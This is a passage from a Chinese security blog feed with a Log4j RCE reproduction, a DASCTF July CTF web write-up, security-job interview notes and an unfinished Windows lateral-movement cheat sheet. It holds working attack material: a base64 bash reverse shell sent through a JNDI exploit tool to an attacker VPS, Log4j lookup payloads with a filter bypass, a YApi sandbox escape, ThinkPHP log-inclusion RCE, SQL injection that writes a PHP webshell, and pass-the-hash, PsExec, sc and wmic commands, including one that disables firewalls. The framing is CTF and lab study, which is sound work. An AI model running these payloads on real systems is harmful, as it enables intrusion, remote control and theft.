href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">jndi注入工具</a>构造反弹shell命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line">-C - 远程class文件中要执行的命令。命令会被作为参数传入Runtime.getRuntime().exec()，所以需要确保命令传入exec()方法可执行。</span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;1.1.1.1&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE=  是反弹shell的base64加密   只需要修改成反弹到vps的ip端口</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213004824709.png" alt="image-20211213004824709"></p><p>-A “1.1.1.1”   1.1.1.1换成自己vps的ip</p><p>在vps上启动 JNDI-Injection-Exploit，这里生成的有 JNDI链接，一会使用最后 JNDI链接，其他的没有成功 （确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用）</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013010020.png" alt="image-20211213013010020"></p><p>再开个框，对我们反弹shell的端口进行监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 10015</span><br></pre></td></tr></table></figure><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213005641455.png" alt="image-20211213005641455"></p><p>payload=${jndi:ldap://ip/exp} 修改为 payload=${jndi:rmi://106.xx.xx.xx:1099/jwbmm8} (ldap://ip/exp替换成生成的 JNDI链接，上面生成的有)</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012806412.png" alt="image-20211213012806412"></p><p>复现时间超时，靶场端口变了，不影响</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013101617.png" alt="image-20211213013101617"></p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012602963.png" alt="image-20211213012602963"></p><p>成功反弹shell</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012641273.png" alt="image-20211213012641273"></p><p>找到flag</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013340992.png" alt="image-20211213013340992"></p><p>注意：vps对应端口一定要开放，</p><hr><p><a href="https://mp.weixin.qq.com/s/IZVR33igxU1mhAQlow7C2Q">参考</a></p><p><a href="https://mp.weixin.qq.com/s/JtNoGVpDlom1kC3h9CoLTQ">参考1</a></p><p><a href="https://mp.weixin.qq.com/s/4On4wXxchioqIHTsCJPq3w">原理参考2</a></p><p><a href="https://mp.weixin.qq.com/s/IxXGcpjN6KkDGPQYPJXHTA">原理参考3</a></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="补丁之前"><a href="#补丁之前" class="headerlink" title="补丁之前"></a>补丁之前</h4><ol><li>可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。</li><li>关闭<code>lookup</code>功能，即：设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></li></ol><h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p><p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;ip:port&#x2F;exp&#125;</span><br></pre></td></tr></table></figure><h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p><p>貌似又被绕过了</p><hr><p>下次分析下fastjson反序列化漏洞原理，和这个漏洞类似</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）&quot;&gt;&lt;a href=&quot;#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）&quot; class=&quot;headerlink&quot; title=&quot;Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）&quot;&gt;&lt;/a&gt;Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）&lt;/h1&gt;&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就&lt;code&gt;Java的日志记录工具&lt;/code&gt;。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。&lt;/p&gt;
&lt;p&gt;log4j2中存在&lt;code&gt;JNDI注入漏洞&lt;/code&gt;，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上&lt;code&gt;执行任意代码&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="log4j2" scheme="http://example.com/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>21DASCTFJuly</title>
    <link href="http://example.com/2021/08/01/21DASCTFJuly/"/>
    <id>http://example.com/2021/08/01/21DASCTFJuly/</id>
    <published>2021-08-01T10:54:10.000Z</published>
    <updated>2021-09-12T13:00:03.746Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>您的排名：148      慢慢复现有时间</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801183537143.png" alt="image-20210801183537143"></p><a id="more"></a><h4 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h4><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180135739.png" alt="image-20210801180135739"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  </span><br><span class="line">    $cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,$cmd))  &#123;    </span><br><span class="line">    $cmd = escapeshellarg($cmd);    </span><br><span class="line">    system(<span class="string">&#x27;cat &#x27;</span> . $cmd);  &#125;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180247394.png" alt="image-20210801180247394"></p><p>猜测命令执行查看历史命令文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure><p><code>escapeshellarg()</code>函数  把字符串转码为可以在 shell 命令里使用的参数，不会绕过。。。</p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p><p>看过wp才知道要想读日志，nginx日志默认路径<code>/var/log/nginx/access.log</code></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123025756.png" alt="image-20210820123025756"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123606239.png" alt="image-20210820123606239"></p><p><code>escapeshellarg()</code>利用非ascii字符绕过，%aa,%ba,%fa</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125330839.png" alt="image-20210820125330839"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125339970.png" alt="image-20210820125339970"></p><h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p><p>注册，创建项目</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p><p>这里可以命令执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;command&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180857819.png" alt="image-20210801180857819"></p><p>保存后，添加接口</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180938961.png" alt="image-20210801180938961"></p><p>访问接口</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801181000869.png" alt="image-20210801181000869"></p><p>即可看到命令执行结果，直接命令执行得flag</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801181010300.png" alt="image-20210801181010300"></p><p><a href="https://www.pwnwiki.org/index.php?title=Yapi_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">参考：</a></p><h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h4><p>v3.2.3直接网上找rce</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801181452123.png" alt="image-20210801181452123"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>要burp中 执行，url中执行不行</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801182210100.png" alt="image-20210801182210100"></p><p>查看对应日志文件，注意日志时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;21_08_01.log</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/21DASCTFJuly/image-20210801182233463.png" alt="image-20210801182233463"></p><p>命令执行成功，</p><p>上马</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801182553174.png" alt="image-20210801182553174"></p><p>蚁剑连接好像不太行，奇怪有时候可以</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801182808593.png" alt="image-20210801182808593"></p><p>找到flag</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p><h4 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h4><p>根据网上爆出了sql注入，在后台登陆处，</p><p>然后根据目录扫描<a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$user=fl_html(f1_vvv(fl_value($_POST[<span class="string">&#x27;user&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$password=fl_html(f1_vvv(fl_value($_POST[<span class="string">&#x27;password&#x27;</span>])));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f1_vvv  函数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, $str))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码得到过滤了<code>空格</code>和<code>0x</code>，fl_value函数对一些关键词做了过滤，</p><p>判断5列</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210912182056650.png" alt="image-20210912182056650"></p><p>但是后门写马时候也要注意部分关键字被replace为空格</p><p>后门马</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210912184824092.png" alt="image-20210912184824092"></p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&amp;password&#x3D;dd&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;16&amp;submit.y&#x3D;29</span><br></pre></td></tr></table></figure><p>response</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bad！hacker！&lt;br&gt;sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name&#x3D;&#39;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&#39; limit 0,1</span><br></pre></td></tr></table></figure><p>select，outfile要双写</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210912183311495.png" alt="image-20210912183311495">、</p><p>查看后门</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210912183414063.png" alt="image-20210912183414063"></p><p>命令执行</p><p><img src="/2021/08/01/21DASCTFJuly/image-20210912184256103.png" alt="image-20210912184256103"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;p&gt;您的排名：148      慢慢复现有时间&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/01/21DASCTFJuly/image-20210801183537143.png&quot; alt=&quot;image-20210801183537143&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="DASCTF July X CBCTF 4th" scheme="http://example.com/tags/DASCTF-July-X-CBCTF-4th/"/>
    
  </entry>
  
  <entry>
    <title>面经</title>
    <link href="http://example.com/2021/07/01/%E9%9D%A2%E7%BB%8F/"/>
    <id>http://example.com/2021/07/01/%E9%9D%A2%E7%BB%8F/</id>
    <published>2021-07-01T11:05:19.000Z</published>
    <updated>2022-03-28T15:43:38.811Z</updated>
    
    <content type="html"><![CDATA[<ul><li>记录下个人面试经验</li></ul><h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生   base南京</p><h4 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试（hr邀请）</p><ul><li>sql注入有回显和没有回显，怎么处理</li><li>sql注入过滤绕过</li><li>xss绕过</li><li>csrf利用</li></ul><a id="more"></a><ul><li>文件上传利用，绕过</li><li>中间件一些（解析）漏洞</li><li>php反序列化，php文件包含</li><li>php代码审计的一些东西</li><li>ssrf利用，出现在哪些地方</li><li>redis  getshell 的几种方式</li><li>mysql提权</li><li>windows/linux提权</li><li>mssql提权</li><li>给你一个域名，说下你的渗透测试思路</li><li>护网的一些经历</li></ul><p>感觉也有部分没有回答出来，提权和redis那块不是很了解。</p><p>总体来说面的很全面，面试官很好，只有一面，很快通过了。</p><p>在boss直聘上投的。</p><h2 id="长亭科技"><a href="#长亭科技" class="headerlink" title="长亭科技"></a>长亭科技</h2><p>安全服务实习生    base南京</p><h4 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试</p><ul><li>不想写了，反正是非常基础的知识原理(基础web+代码审计+渗透测试流程)。</li></ul><p>这是上海给我面的，感觉面试官很好，比较简单，考察不深，我说他们搞错了，然后二面转南京了。</p><h4 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h4><p>2021.6 视频面试</p><ul><li><p>自我介绍，紧张到嘴瓢。。</p></li><li><p>报错注入函数</p></li></ul><p>updataxml()，extractvalue()紧张到忘了第一个都忘了，日了。然后问还有其他的吗？？我？</p><ul><li>xml全称</li></ul><p>不会了。（EXtensible Markup Language）</p><ul><li>http-only怎么绕过</li></ul><p>以前看过的，忘了。</p><ul><li>SQL盲注怎样提高效率</li></ul><p>回答二分法，（结束后百度的<a href="https://www.freebuf.com/articles/web/231741.html%EF%BC%89">https://www.freebuf.com/articles/web/231741.html）</a></p><ul><li>domxss能被waf拦截吗</li></ul><p>肯定不能啊，巴拉巴拉说了一下。</p><ul><li>domxss发生在DOM文档里面还是外面</li></ul><p>我说在DOM节点上</p><ul><li>本地文件包含getshell方式</li></ul><ol><li>包含jpg文件（有木马）去getshell</li><li>读配置文件</li><li>伪协议（data忘记了）</li></ol><p>问我还有吗，后面就不知道了。</p><ul><li>代码审计了解吗，审计过什么</li></ul><p>说下自己打ctf遇见的一些题目，还有dedecms，还有些忘记了，就说没有了。</p><ul><li>如何利用ssrf</li></ul><p>file协议，dict协议，打redis。（不全）</p><ul><li>没有回显ssrf如何判断</li></ul><p>我说用dnslog回显，他说这个只能判断他出网，不能判断他是否能访问内网，然后不知道了，貌似以前看到过。后面在学学吧。</p><p>二面开始有点紧张，面的很细节，感觉很多没有回答出来，感觉很cccc，感觉简历只面了一半，应该面试官认为我太菜了~~，不想面我了。gg了。长亭二面含金量太高了。</p><p>内推的，直接投，没有人理我。</p><hr><h2 id="杭州默安"><a href="#杭州默安" class="headerlink" title="杭州默安"></a>杭州默安</h2><ul><li>2022.3.28 渗透测试 \安服 实习生   ，base南京</li><li>很突然，正在玩一个电话打了过来</li></ul><ol><li>介绍自己</li><li>看你写有了解后渗透，说下具体</li><li>你对哪方面擅长（web渗透，代码审计，后渗透）</li><li>sql注入，判断，过滤</li><li>登陆框如何利用</li><li>xss分类  ？？/?</li><li>ssrf 利用，</li><li>ssrf+redis  如何getshell</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">计划任务反弹shell</span><br><span class="line"></span><br><span class="line">主从复制   （不会）</span><br></pre></td></tr></table></figure><ol start="10"><li><p>csrf 发生，利用</p></li><li><p>mssql命令执行函数</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> xp_cmdshell</span><br><span class="line"></span><br><span class="line">**SP_OACREATE** (这个忘了)</span><br></pre></td></tr></table></figure><ol start="12"><li>说下你代码审计</li><li>说下你的问题</li></ol><p>感觉很面的基础，没有很深入问，</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;记录下个人面试经验&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;赛宁网安&quot;&gt;&lt;a href=&quot;#赛宁网安&quot; class=&quot;headerlink&quot; title=&quot;赛宁网安&quot;&gt;&lt;/a&gt;赛宁网安&lt;/h2&gt;&lt;p&gt;信息安全实习生   base南京&lt;/p&gt;
&lt;h4 id=&quot;一面&quot;&gt;&lt;a href=&quot;#一面&quot; class=&quot;headerlink&quot; title=&quot;一面&quot;&gt;&lt;/a&gt;一面&lt;/h4&gt;&lt;p&gt;2021.6 电话面试（hr邀请）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sql注入有回显和没有回显，怎么处理&lt;/li&gt;
&lt;li&gt;sql注入过滤绕过&lt;/li&gt;
&lt;li&gt;xss绕过&lt;/li&gt;
&lt;li&gt;csrf利用&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="经历" scheme="http://example.com/categories/%E7%BB%8F%E5%8E%86/"/>
    
    
    <category term="2021面经" scheme="http://example.com/tags/2021%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网横向渗透</title>
    <link href="http://example.com/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</id>
    <published>2021-06-21T08:04:54.000Z</published>
    <updated>2022-06-07T04:03:12.373Z</updated>
    
    <content type="html"><![CDATA[<p>不断更新</p><p>配合impacket工具使用</p><h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p><p>利用条件：</p><ol><li>开放139,445端口</li><li></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">-accepteula: 第一次运行PsExec会弹出确认框，使用该参数就不会出现</span><br><span class="line">-s: 以system权限运行远程进程，获得一个system权限的交互式shell,不使用此参数获得一个 administrator的shell</span><br></pre></td></tr></table></figure><h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><p>windows 2008 以下 at</p><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><p>windows 2008 及以上 schtasks</p><h3 id="Atexec"><a href="#Atexec" class="headerlink" title="Atexec"></a>Atexec</h3><ul><li>Impacket套件中的Atexec.py  能通过windows计划任务执行远程命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b</span><br><span class="line">shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h3 id="ipc-sc"><a href="#ipc-sc" class="headerlink" title="ipc+sc"></a>ipc+sc</h3><p>sc主要用来对操作系统服务进行管理</p><p>建立ipc后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc \\ip  create servername binpath&#x3D; &quot;c:\door.exe&quot; start&#x3D;auto</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line"></span><br><span class="line">sc \ip start servername</span><br></pre></td></tr></table></figure><p>​        </p><p>sc通过服务关防火墙 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\ip create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\ip start unablefirewall</span><br></pre></td></tr></table></figure><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>前言：</p><p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。</p><p>平时可以用wmic查看进程/安装程序</p><ul><li>开放135，没有开防火墙</li></ul><p>利用：</p><p>ipc+wmic：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:IP &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;node:192.168.xxx.xxx &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; 